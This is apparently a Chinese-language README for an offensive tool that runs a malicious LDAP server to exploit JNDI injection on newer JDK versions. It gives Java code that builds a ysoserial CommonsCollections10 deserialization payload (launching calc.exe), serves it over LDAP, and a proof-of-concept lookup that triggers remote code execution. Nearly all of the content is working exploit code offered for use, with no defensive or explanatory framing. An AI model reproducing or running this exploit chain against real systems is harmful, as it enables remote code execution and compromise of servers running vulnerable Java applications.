# LDAP Server

**直接存储 serialization 数据，用于 jdk 高版本的 jndi 注入**

运行 Main ，实现 ldap server 的启动，和 exp 的 bind ：

```java
import runnable.BindEXP;
import runnable.RunLDAPServer;
import ysoserial.payloads.CommonsCollections10;

public class Main {
    public static void main(String[] args) throws Exception {
        Object o = new CommonsCollections10().getObject("calc.exe");
        RunLDAPServer.runLDAPServer();
        BindEXP.bindEXP(o);
    }
}
```

## poc

运行之后 lookup `ldap://0.0.0.0:9999/cn=exp,dc=ldap,dc=fuck` 就能 rce ：

```java
import javax.naming.directory.DirContext;
import javax.naming.directory.InitialDirContext;

public class Poc {
    public static void main(String[] args) throws Exception{
        String url = "ldap://127.0.0.1:9999/cn=exp,dc=ldap,dc=fuck";
        DirContext ctx = new InitialDirContext();
        ctx.lookup(url);
    }
}

```













